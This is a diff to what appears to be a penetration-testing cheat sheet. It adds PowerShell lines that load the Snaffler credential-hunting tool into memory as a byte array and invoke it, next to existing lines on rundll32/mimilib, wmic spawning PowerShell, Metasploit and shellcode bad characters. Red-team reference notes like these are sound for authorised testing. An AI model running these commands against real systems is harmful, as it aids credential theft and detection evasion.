@@ -566,6 +566,16 @@ If you have path traversal plus a location with write access you can exploit tha
   `rundll32 c:\path\mimilib.dll,start d:\otherpath\a.exe`  
 - Run PowerShell.exe via wmic.exe:   
   `wmic.exe process call create "cmd /c powershell"`   
+- Load a binary into byte array and run it from powershell:   
+  `[byte[]]$bytes = get-content -encoding byte -path C:\Users\username\Desktop\Snaffler.exe`   
+  `$asm = [System.Reflection.Assembly]::Load($bytes)`   
+  `$vars = New-Object System.Collections.Generic.List[System.Object]`   
+  `$vars.Add("-s")`   
+  `$vars.Add("-o")`   
+  `$vars.Add("snaffler.log")`   
+  `$passed = [string[]]$vars.ToArray()`   
+  `$asm.EntryPoint.Invoke($null, @(,$passed))`   
+
 
 ## Metasploit
 - Multihandler:
@@ -646,3 +656,5 @@ If you have path traversal plus a location with write access you can exploit tha
   `"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )`  
 
 Generate shellcode (may need to use different encoder due to huge list of bad characters. x86/fnstenv_mov may help)
+
+## 
